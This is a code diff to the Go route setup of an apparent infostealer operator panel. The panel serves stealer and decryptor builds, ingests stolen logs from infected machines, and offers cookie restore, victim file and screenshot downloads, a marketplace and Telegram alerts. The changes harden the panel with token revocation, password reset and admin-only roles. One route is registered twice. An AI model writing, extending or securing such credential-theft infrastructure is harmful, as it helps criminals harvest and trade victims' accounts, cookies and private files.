@@ -9,12 +9,13 @@ import (
 
 	"github.com/go-chi/chi/v5"
 	"zialfi-panel/internal/auth"
+	"zialfi-panel/internal/db"
 	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/services"
 	"zialfi-panel/internal/ws"
 )
 
-func AuthMiddleware(secret string) func(http.Handler) http.Handler {
+func AuthMiddleware(secret string, dbConn *sql.DB) func(http.Handler) http.Handler {
 	return func(next http.Handler) http.Handler {
 		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 			header := r.Header.Get("Authorization")
@@ -30,46 +31,63 @@ func AuthMiddleware(secret string) func(http.Handler) http.Handler {
 				return
 			}
 
+			// Verify token_version matches DB to support token revocation
+			var dbVersion int
+			if err := dbConn.QueryRow("SELECT COALESCE(token_version, 0) FROM users WHERE id = $1", claims.UserID).Scan(&dbVersion); err != nil {
+				writeError(w, http.StatusUnauthorized, "user not found")
+				return
+			}
+			if claims.TokenVersion != dbVersion {
+				writeError(w, http.StatusUnauthorized, "token has been revoked")
+				return
+			}
+
 			ctx := middleware.ContextWithClaims(r.Context(), claims)
 			next.ServeHTTP(w, r.WithContext(ctx))
 		})
 	}
 }
 
-func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
-	authHandler := NewAuthHandler(db, jwtSecret)
-	usersHandler := NewUsersHandler(db, jwtSecret)
-	statsHandler := NewStatsHandler(db, hub)
-	logProc := services.NewLogProcessor(db, hub)
+func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, broadcaster services.Broadcaster) {
+	authHandler := NewAuthHandler(sqlDB, jwtSecret)
+	usersHandler := NewUsersHandler(sqlDB, jwtSecret)
+	statsHandler := NewStatsHandler(sqlDB, hub)
+	if broadcaster == nil && hub != nil {
+		broadcaster = hub
+	}
+	logProc := services.NewLogProcessor(sqlDB, broadcaster)
 	logsHandler := NewLogsHandler(logProc)
-	sessionsHandler := NewSessionsHandler(db)
-	searchHandler := NewSearchHandler(db)
-	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
-	notesHandler := NewNotesHandler(db)
-	exportHandler := NewExportHandler(db)
-	settingsHandler := NewSettingsHandler(db, jwtSecret)
-	restoreHandler := NewRestoreHandler(db)
-	chatHandler := NewChatHandler(db, hub)
-	ticketHandler := NewTicketHandler(db)
-	marketplaceHandler := NewMarketplaceHandler(db)
-	totpHandler := NewTOTPHandler(db)
-	sessMgmtHandler := NewSessionMgmtHandler(db)
-	apiKeyHandler := NewAPIKeyHandler(db)
+	sessionsHandler := NewSessionsHandler(sqlDB, broadcaster)
+	searchHandler := NewSearchHandler(sqlDB)
+	dataHandler := NewDataHandler(sqlDB)
+	filesHandler := NewFilesHandler(sqlDB)
+	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB)
+	notesHandler := NewNotesHandler(sqlDB)
+	exportHandler := NewExportHandler(sqlDB)
+	settingsHandler := NewSettingsHandler(sqlDB, jwtSecret)
+	restoreHandler := NewRestoreHandler(sqlDB)
+	chatHandler := NewChatHandler(sqlDB, hub)
+	ticketHandler := NewTicketHandler(sqlDB)
+	marketplaceHandler := NewMarketplaceHandler(sqlDB)
+	totpHandler := NewTOTPHandler(sqlDB)
+	sessMgmtHandler := NewSessionMgmtHandler(sqlDB)
+	apiKeyHandler := NewAPIKeyHandler(sqlDB)
 	docsHandler := NewDocsHandler()
-	publicStatsHandler := NewPublicStatsHandler(db)
-	pricingHandler := NewPricingHandler(db)
-	referralHandler := NewReferralHandler(db)
-
-	// Handlers that were implemented but not registered
-	telegramBotHandler := NewTelegramBotHandler(db)
-	teamHandler := NewTeamHandler(db)
-	auditHandler := NewAuditHandler(db)
-	banAPIHandler := NewBanHandler(db)
-
+	publicStatsHandler := NewPublicStatsHandler(sqlDB)
+	pricingHandler := NewPricingHandler(sqlDB)
+	referralHandler := NewReferralHandler(sqlDB)
+	systemHealthHandler := NewSystemHealthHandler()
+	telegramBotHandler := NewTelegramBotHandler(sqlDB)
+	teamHandler := NewTeamHandler(sqlDB)
+	auditHandler := NewAuditHandler(sqlDB)
+	banAPIHandler := NewBanHandler(sqlDB)
+	workerActivityHandler := NewWorkerActivityHandler(sqlDB)
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
 		r.Post("/api/auth/register", usersHandler.Register)
 		r.With(middleware.RateLimit(10, time.Minute)).Post("/api/auth/2fa/verify-login", authHandler.VerifyLogin)
+		r.With(middleware.RateLimit(3, 15*time.Minute)).Post("/api/auth/forgot-password", authHandler.ForgotPassword)
+		r.With(middleware.RateLimit(5, 15*time.Minute)).Post("/api/auth/reset-password", authHandler.ResetPassword)
 		r.Get("/api/auth/2fa/required", totpHandler.Required)
 		r.Get("/api/public/stats", publicStatsHandler.GetPublicStats)
 		r.Get("/api/pricing", pricingHandler.ListTiers)
@@ -77,7 +95,7 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 
 	// Log ingestion — protected by API key (static token from stealer), not JWT
 	r.Group(func(r chi.Router) {
-		r.Use(middleware.APIKeyAuth(db))
+		r.Use(middleware.APIKeyAuth(sqlDB))
 
 		r.Post("/api/log", logsHandler.Ingest)
 		r.Post("/api/log/chunk", logsHandler.Chunk)
@@ -85,7 +103,7 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 	})
 
 	r.Group(func(r chi.Router) {
-		r.Use(AuthMiddleware(jwtSecret))
+		r.Use(AuthMiddleware(jwtSecret, sqlDB))
 
 		r.Get("/api/auth/me", authHandler.Me)
 
@@ -106,6 +124,8 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 
 		r.Get("/api/stats", statsHandler.Dashboard)
 
+		r.Get("/api/system/health", systemHealthHandler.Health)
+
 		// Docs (auth required)
 		r.Get("/api/docs", docsHandler.List)
 		r.Get("/api/docs/*", docsHandler.Get)
@@ -113,24 +133,31 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.Get("/api/sessions", sessionsHandler.List)
 		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
 		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
+		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/empty", sessionsHandler.DeleteEmpty)
 		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
 		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
+		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)
 
 		r.Get("/api/search", searchHandler.Search)
 		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)
 
-		detectHandler := NewDuplicateDetectHandler(db)
+		r.Get("/api/data/{type}", dataHandler.List)
+		r.Get("/api/sessions/{id}/files/{fid}/download", filesHandler.Download)
+
+		detectHandler := NewDuplicateDetectHandler(sqlDB)
 		r.Get("/api/detect/duplicates", detectHandler.Detect)
 
-		domainDetectHandler := NewDomainDetectHandler(db)
+		domainDetectHandler := NewDomainDetectHandler(sqlDB)
 		r.Get("/api/domain-detect", domainDetectHandler.List)
 		r.Post("/api/domain-detect", domainDetectHandler.Create)
 		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
 		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)
 
-		r.Get("/api/filter-presets", NewFilterPresetsHandler(db).List)
+		r.Get("/api/filter-presets", NewFilterPresetsHandler(sqlDB).List)
 
-		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)
+		screenshotsHandler := NewScreenshotsHandler(sqlDB)
+		r.Get("/api/sessions/{id}/screenshot", screenshotsHandler.Get)
+		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/{id}/screenshot", screenshotsHandler.Delete)
 
 		sspHandler := NewSSPHandler(logProc)
 		r.Post("/api/log/ssp", sspHandler.ProcessSSP)
@@ -140,17 +167,21 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 			r.Get("/", buildHandler.List)
 			r.Get("/stats", buildHandler.Stats)
 			r.Get("/{id}/download", buildHandler.Download)
+			r.Put("/{id}/tag", buildHandler.UpdateTag)
+			r.Get("/{id}/status", buildHandler.Status)
 		})
-
 		r.Get("/api/sessions/{id}/notes", notesHandler.List)
 		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
 		r.Delete("/api/notes/{id}", notesHandler.Delete)
 
 		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
+		r.Get("/api/sessions/{id}/export", exportHandler.ExportSession)
 		r.Post("/api/export/bulk", exportHandler.ExportBulk)
+		r.Get("/api/export/useragents", exportHandler.ExportUserAgents)
+		r.With(middleware.RequireRole("admin")).Get("/api/team/activity", workerActivityHandler.List)
 
-		r.Get("/api/settings", settingsHandler.Get)
-		r.Put("/api/settings", settingsHandler.Update)
+		r.With(middleware.RequireRole("admin")).Get("/api/settings", settingsHandler.Get)
+		r.With(middleware.RequireRole("admin")).Put("/api/settings", settingsHandler.Update)
 
 		// Cookie restore
 		r.Post("/api/restore/cookies", restoreHandler.Restore)
@@ -198,11 +229,11 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		store := services.NewSettingsStore(
 			func(key string) (string, error) {
 				var val string
-				err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
+				err := db.QueryRow(sqlDB, "SELECT value FROM settings WHERE key = ?", key).Scan(&val)
 				return val, err
 			},
 			func(key, value string) error {
-				_, err := db.Exec("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
+				_, err := db.Exec(sqlDB, "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
 				return err
 			},
 		)
@@ -219,19 +250,22 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)
 
 		// Telegram bots
-		r.Get("/api/telegram/bots", telegramBotHandler.List)
-		r.Post("/api/telegram/bots", telegramBotHandler.Create)
-		r.Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
-		r.Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
-		r.Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
-		r.Get("/api/telegram/filters", telegramBotHandler.ListFilters)
-		r.Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
-		r.Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)
+		r.With(middleware.RequireRole("admin")).Get("/api/telegram/bots", telegramBotHandler.List)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/bots", telegramBotHandler.Create)
+		r.With(middleware.RequireRole("admin")).Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
+		r.With(middleware.RequireRole("admin")).Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
+		r.With(middleware.RequireRole("admin")).Get("/api/telegram/filters", telegramBotHandler.ListFilters)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
+		r.With(middleware.RequireRole("admin")).Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)
 
 		// Team management (admin only — prevents privilege escalation)
 		r.With(middleware.RequireRole("admin")).Get("/api/team", teamHandler.List)
 		r.With(middleware.RequireRole("admin")).Put("/api/team/{id}/role", teamHandler.ChangeRole)
 		r.With(middleware.RequireRole("admin")).Delete("/api/team/{id}", teamHandler.Remove)
+
+		// Worker activity log (admin only)
+		r.With(middleware.RequireRole("admin")).Get("/api/team/activity", workerActivityHandler.List)
 
 		// Audit log (admin only)
 		r.With(middleware.RequireRole("admin")).Get("/api/audit", auditHandler.List)
